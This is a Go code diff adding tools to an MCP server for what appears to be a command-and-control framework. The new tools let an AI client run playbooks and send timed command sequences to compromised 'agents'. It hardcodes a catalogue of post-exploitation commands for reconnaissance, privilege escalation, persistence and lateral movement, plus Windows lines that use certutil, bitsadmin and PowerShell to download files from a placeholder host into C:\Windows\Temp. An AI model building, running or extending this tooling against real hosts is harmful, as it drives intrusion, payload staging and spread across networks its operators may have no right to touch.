@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"time"
 
+	"github.com/adaptix/adaptix_mcp/pkg/playbook"
 	"github.com/adaptix/adaptix_mcp/pkg/utils"
 )
 
@@ -123,8 +124,156 @@ func (s *MCPServer) registerTools() {
 	s.tools["update_agent_metadata"] = s.handleUpdateAgentMetadataTool
 	s.tools["list_targets"] = s.handleListTargetsTool
 	s.tools["list_pivots"] = s.handleListPivotsTool
+	s.tools["list_playbooks"] = s.handleListPlaybooksTool
+	s.tools["get_playbook"] = s.handleGetPlaybookTool
+	s.tools["run_playbook"] = s.handleRunPlaybookTool
+	s.tools["get_playbook_run"] = s.handleGetPlaybookRunTool
+	s.tools["list_triggers"] = s.handleListTriggersTool
+	s.tools["manage_trigger"] = s.handleManageTriggerTool
+	s.tools["simulate_event"] = s.handleSimulateEventTool
 
-	utils.DebugLogger.Println("🛠️  Registered 16 tools")
+	// 战术指导工具
+	s.tools["list_tactical_phases"] = s.handleListTacticalPhasesTool
+	s.tools["get_tactical_commands"] = s.handleGetTacticalCommandsTool
+	s.tools["run_tactical_sequence"] = s.handleRunTacticalSequenceTool
+
+	utils.DebugLogger.Println("🛠️  Registered 28 tools")
+}
+
+func (s *MCPServer) handleListPlaybooksTool(params map[string]interface{}) (interface{}, error) {
+	list, err := playbook.ListPlaybooks()
+	if err != nil {
+		return nil, err
+	}
+	return map[string]interface{}{
+		"playbooks": list,
+		"total":     len(list),
+	}, nil
+}
+
+func (s *MCPServer) handleGetPlaybookTool(params map[string]interface{}) (interface{}, error) {
+	playbookID, err := extractStringParam(params, "playbook_id", true)
+	if err != nil {
+		return nil, err
+	}
+
+	doc, path, err := playbook.LoadPlaybookByID(playbookID)
+	if err != nil {
+		return nil, err
+	}
+
+	return map[string]interface{}{
+		"path":     path,
+		"playbook": doc,
+	}, nil
+}
+
+func (s *MCPServer) handleRunPlaybookTool(params map[string]interface{}) (interface{}, error) {
+	playbookID, err := extractStringParam(params, "playbook_id", true)
+	if err != nil {
+		return nil, err
+	}
+
+	inputs, err := extractMapParam(params, "inputs", false)
+	if err != nil {
+		return nil, err
+	}
+	if inputs == nil {
+		inputs = map[string]interface{}{}
+	}
+
+	// 检查是否只做计划（不执行）
+	planOnly, _ := extractBoolParam(params, "plan_only", false)
+
+	doc, path, err := playbook.LoadPlaybookByID(playbookID)
+	if err != nil {
+		return nil, err
+	}
+
+	// 如果只是计划模式，创建并返回运行记录
+	if planOnly {
+		plan := map[string]interface{}{
+			"playbook_id":   playbookID,
+			"playbook_path": path,
+			"metadata":      doc.Metadata,
+			"spec":          doc.Spec,
+		}
+		rec, runPath, err := playbook.CreateRun(playbookID, inputs, plan)
+		if err != nil {
+			return nil, err
+		}
+		return map[string]interface{}{
+			"run":      rec,
+			"run_path": runPath,
+			"mode":     "plan_only",
+		}, nil
+	}
+
+	// 加载 Action Catalog
+	catalog, err := playbook.LoadActionCatalog()
+	if err != nil {
+		return nil, fmt.Errorf("failed to load action catalog: %w", err)
+	}
+
+	// 创建执行引擎
+	engine := playbook.NewEngine(catalog, s.invokeToolForPlaybook)
+
+	// 执行 playbook
+	runState, err := engine.Execute(doc, inputs)
+	if err != nil {
+		// 即使执行失败，也保存运行记录
+		if runState != nil {
+			playbook.SaveRun(runState)
+		}
+		return nil, fmt.Errorf("playbook execution failed: %w", err)
+	}
+
+	// 保存运行记录
+	rec, runPath, err := playbook.SaveRun(runState)
+	if err != nil {
+		return nil, fmt.Errorf("failed to save run: %w", err)
+	}
+
+	// 构建步骤摘要
+	stepsSummary := make(map[string]interface{})
+	for id, step := range runState.Steps {
+		stepsSummary[id] = map[string]interface{}{
+			"status":    step.Status,
+			"extracted": step.Extracted,
+		}
+		if step.Error != "" {
+			stepsSummary[id].(map[string]interface{})["error"] = step.Error
+		}
+	}
+
+	return map[string]interface{}{
+		"run":      rec,
+		"run_path": runPath,
+		"status":   runState.Status,
+		"steps":    stepsSummary,
+	}, nil
+}
+
+// invokeToolForPlaybook 为 playbook 执行引擎提供工具调用能力
+func (s *MCPServer) invokeToolForPlaybook(toolName string, args map[string]interface{}) (interface{}, error) {
+	handler, ok := s.tools[toolName]
+	if !ok {
+		return nil, fmt.Errorf("unknown tool: %s", toolName)
+	}
+	return handler(args)
+}
+
+func (s *MCPServer) handleGetPlaybookRunTool(params map[string]interface{}) (interface{}, error) {
+	runPath, err := extractStringParam(params, "run_path", true)
+	if err != nil {
+		return nil, err
+	}
+
+	rec, err := playbook.ReadRun(runPath)
+	if err != nil {
+		return nil, err
+	}
+	return rec, nil
 }
 
 // routeTool 路由Tool请求
@@ -845,4 +994,260 @@ func (s *MCPServer) handleListPivotsTool(params map[string]interface{}) (interfa
 		"pivots": []interface{}{},
 		"total":  0,
 	}, nil
+}
+
+// handleListTriggersTool 列出所有触发规则
+func (s *MCPServer) handleListTriggersTool(params map[string]interface{}) (interface{}, error) {
+	rules := playbook.GetTriggerManager().ListRules()
+	return map[string]interface{}{
+		"triggers": rules,
+		"total":    len(rules),
+	}, nil
+}
+
+// handleManageTriggerTool 管理触发规则
+func (s *MCPServer) handleManageTriggerTool(params map[string]interface{}) (interface{}, error) {
+	action, err := extractStringParam(params, "action", true)
+	if err != nil {
+		return nil, err
+	}
+
+	ruleID, err := extractStringParam(params, "rule_id", true)
+	if err != nil {
+		return nil, err
+	}
+
+	tm := playbook.GetTriggerManager()
+
+	switch action {
+	case "enable":
+		if err := tm.SetRuleEnabled(ruleID, true); err != nil {
+			return nil, err
+		}
+		return map[string]interface{}{
+			"message": fmt.Sprintf("✅ Trigger %s enabled", ruleID),
+		}, nil
+
+	case "disable":
+		if err := tm.SetRuleEnabled(ruleID, false); err != nil {
+			return nil, err
+		}
+		return map[string]interface{}{
+			"message": fmt.Sprintf("✅ Trigger %s disabled", ruleID),
+		}, nil
+
+	default:
+		return nil, fmt.Errorf("invalid action: must be 'enable' or 'disable'")
+	}
+}
+
+// handleSimulateEventTool 模拟事件（用于测试触发器）
+func (s *MCPServer) handleSimulateEventTool(params map[string]interface{}) (interface{}, error) {
+	eventType, err := extractStringParam(params, "event_type", true)
+	if err != nil {
+		return nil, err
+	}
+
+	eventData, err := extractMapParam(params, "data", false)
+	if err != nil {
+		return nil, err
+	}
+	if eventData == nil {
+		eventData = map[string]interface{}{}
+	}
+
+	event := playbook.CreateEventFromAgentData(playbook.EventType(eventType), eventData)
+	playbook.GetTriggerManager().HandleEvent(event)
+
+	return map[string]interface{}{
+		"message":    fmt.Sprintf("✅ Simulated event: %s", eventType),
+		"event_data": eventData,
+	}, nil
+}
+
+// ==================== 战术指导工具 ====================
+
+// handleListTacticalPhasesTool 列出战术阶段
+func (s *MCPServer) handleListTacticalPhasesTool(params map[string]interface{}) (interface{}, error) {
+	osType, _ := extractStringParam(params, "os", false)
+	if osType == "" {
+		osType = "windows"
+	}
+
+	phases := getTacticalPhases(osType)
+	return map[string]interface{}{
+		"os":     osType,
+		"phases": phases,
+		"total":  len(phases),
+	}, nil
+}
+
+// handleGetTacticalCommandsTool 获取指定阶段的命令
+func (s *MCPServer) handleGetTacticalCommandsTool(params map[string]interface{}) (interface{}, error) {
+	phaseID, err := extractStringParam(params, "phase_id", true)
+	if err != nil {
+		return nil, err
+	}
+
+	osType, _ := extractStringParam(params, "os", false)
+	if osType == "" {
+		osType = "windows"
+	}
+
+	commands := getTacticalCommands(osType, phaseID)
+	return map[string]interface{}{
+		"phase_id": phaseID,
+		"os":       osType,
+		"commands": commands,
+		"total":    len(commands),
+	}, nil
+}
+
+// handleRunTacticalSequenceTool 顺序执行战术命令
+func (s *MCPServer) handleRunTacticalSequenceTool(params map[string]interface{}) (interface{}, error) {
+	agentID, err := extractStringParam(params, "agent_id", true)
+	if err != nil {
+		return nil, err
+	}
+
+	commandsParam, err := extractArrayParam(params, "commands", true)
+	if err != nil {
+		return nil, err
+	}
+
+	delaySeconds, _ := extractNumberParam(params, "delay_seconds", false)
+	if delaySeconds == 0 {
+		delaySeconds = 2
+	}
+
+	results := []map[string]interface{}{}
+	for i, cmdInterface := range commandsParam {
+		cmd, ok := cmdInterface.(string)
+		if !ok {
+			continue
+		}
+
+		// 执行命令
+		result, err := s.handleExecuteCommandTool(map[string]interface{}{
+			"agent_id":        agentID,
+			"command":         cmd,
+			"wait_for_result": false,
+		})
+
+		stepResult := map[string]interface{}{
+			"step":    i + 1,
+			"command": cmd,
+		}
+
+		if err != nil {
+			stepResult["status"] = "error"
+			stepResult["error"] = err.Error()
+		} else {
+			stepResult["status"] = "sent"
+			stepResult["result"] = result
+		}
+
+		results = append(results, stepResult)
+
+		// 间隔延迟
+		if i < len(commandsParam)-1 && delaySeconds > 0 {
+			time.Sleep(time.Duration(delaySeconds) * time.Second)
+		}
+	}
+
+	return map[string]interface{}{
+		"agent_id":      agentID,
+		"total":         len(results),
+		"delay_seconds": delaySeconds,
+		"results":       results,
+	}, nil
+}
+
+// getTacticalPhases 获取战术阶段定义
+func getTacticalPhases(osType string) []map[string]interface{} {
+	if osType == "linux" {
+		return []map[string]interface{}{
+			{"id": "recon", "name": "🔍 侦察", "description": "收集目标系统信息"},
+			{"id": "privesc", "name": "⬆️ 提权", "description": "提升权限"},
+			{"id": "persist", "name": "🔒 持久化", "description": "建立持久访问"},
+			{"id": "lateral", "name": "↔️ 横向", "description": "内网横向移动"},
+		}
+	}
+	return []map[string]interface{}{
+		{"id": "recon", "name": "🔍 侦察", "description": "收集目标系统信息"},
+		{"id": "privesc", "name": "⬆️ 提权", "description": "提升权限"},
+		{"id": "persist", "name": "🔒 持久化", "description": "建立持久访问"},
+		{"id": "lateral", "name": "↔️ 横向", "description": "内网横向移动"},
+		{"id": "transfer", "name": "📥 传输", "description": "文件传输和下载"},
+	}
+}
+
+// getTacticalCommands 获取指定阶段的命令
+func getTacticalCommands(osType, phaseID string) []map[string]interface{} {
+	commands := map[string]map[string][]map[string]interface{}{
+		"windows": {
+			"recon": {
+				{"id": "whoami", "name": "当前用户", "cmd": "whoami /all", "description": "查看当前用户身份和权限组"},
+				{"id": "hostname", "name": "主机名", "cmd": "hostname", "description": "获取计算机名称"},
+				{"id": "ipconfig", "name": "网络配置", "cmd": "ipconfig /all", "description": "查看网络接口配置"},
+				{"id": "systeminfo", "name": "系统信息", "cmd": "systeminfo", "description": "获取操作系统详细信息"},
+				{"id": "arp", "name": "ARP 缓存", "cmd": "arp -a", "description": "查看 ARP 表获取相邻主机"},
+				{"id": "route", "name": "路由表", "cmd": "route print", "description": "查看路由表了解网络拓扑"},
+				{"id": "netstat", "name": "网络连接", "cmd": "netstat -ano", "description": "查看网络连接和监听端口"},
+				{"id": "tasklist", "name": "进程列表", "cmd": "tasklist /v", "description": "查看运行的进程"},
+				{"id": "netuser", "name": "本地用户", "cmd": "net user", "description": "列出本地用户账户"},
+				{"id": "netgroup", "name": "本地组", "cmd": "net localgroup administrators", "description": "查看管理员组成员"},
+			},
+			"privesc": {
+				{"id": "whoami_priv", "name": "当前权限", "cmd": "whoami /priv", "description": "查看当前用户权限"},
+				{"id": "schtasks", "name": "计划任务", "cmd": "schtasks /query /fo LIST /v", "description": "查看计划任务"},
+				{"id": "services", "name": "服务列表", "cmd": "sc query state=all", "description": "查看所有服务"},
+				{"id": "wmic_service", "name": "服务路径", "cmd": "wmic service get name,displayname,pathname,startmode", "description": "查看服务路径(查找未引用路径)"},
+			},
+			"persist": {
+				{"id": "reg_run", "name": "启动项", "cmd": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "description": "查看启动项"},
+				{"id": "schtasks_list", "name": "计划任务", "cmd": "schtasks /query /fo TABLE", "description": "查看计划任务"},
+			},
+			"lateral": {
+				{"id": "net_share", "name": "共享", "cmd": "net share", "description": "查看共享"},
+				{"id": "net_view", "name": "网络邻居", "cmd": "net view", "description": "查看网络邻居"},
+				{"id": "nltest", "name": "域信息", "cmd": "nltest /dclist:", "description": "查看域控列表"},
+			},
+			"transfer": {
+				{"id": "certutil", "name": "CertUtil下载", "cmd": "certutil -urlcache -split -f http://IP/file.exe C:\\Windows\\Temp\\file.exe", "description": "使用 CertUtil 下载文件"},
+				{"id": "bitsadmin", "name": "BitsAdmin下载", "cmd": "bitsadmin /transfer job /download /priority high http://IP/file.exe C:\\Windows\\Temp\\file.exe", "description": "使用 BitsAdmin 下载文件"},
+				{"id": "powershell_iwr", "name": "PowerShell下载", "cmd": "powershell -c \"IWR -Uri http://IP/file.exe -OutFile C:\\Windows\\Temp\\file.exe\"", "description": "使用 PowerShell 下载文件"},
+			},
+		},
+		"linux": {
+			"recon": {
+				{"id": "id", "name": "当前用户", "cmd": "id", "description": "查看当前用户身份"},
+				{"id": "uname", "name": "系统信息", "cmd": "uname -a", "description": "获取系统信息"},
+				{"id": "hostname", "name": "主机名", "cmd": "hostname", "description": "获取主机名"},
+				{"id": "ifconfig", "name": "网络配置", "cmd": "ip addr || ifconfig", "description": "查看网络接口"},
+				{"id": "ps", "name": "进程列表", "cmd": "ps aux", "description": "查看运行进程"},
+				{"id": "netstat", "name": "网络连接", "cmd": "netstat -tulnp || ss -tulnp", "description": "查看网络连接"},
+			},
+			"privesc": {
+				{"id": "sudo_l", "name": "sudo权限", "cmd": "sudo -l", "description": "查看 sudo 权限"},
+				{"id": "suid", "name": "SUID文件", "cmd": "find / -perm -4000 2>/dev/null", "description": "查找 SUID 文件"},
+				{"id": "cron", "name": "定时任务", "cmd": "cat /etc/crontab; ls -la /etc/cron.*", "description": "查看定时任务"},
+			},
+			"persist": {
+				{"id": "crontab", "name": "用户定时任务", "cmd": "crontab -l", "description": "查看当前用户定时任务"},
+				{"id": "bashrc", "name": "bashrc", "cmd": "cat ~/.bashrc", "description": "查看 bashrc"},
+			},
+			"lateral": {
+				{"id": "ssh_keys", "name": "SSH密钥", "cmd": "cat ~/.ssh/known_hosts; ls -la ~/.ssh/", "description": "查看 SSH 密钥和已知主机"},
+				{"id": "hosts", "name": "hosts文件", "cmd": "cat /etc/hosts", "description": "查看 hosts 文件"},
+			},
+		},
+	}
+
+	if osCommands, ok := commands[osType]; ok {
+		if phaseCommands, ok := osCommands[phaseID]; ok {
+			return phaseCommands
+		}
+	}
+	return []map[string]interface{}{}
 }
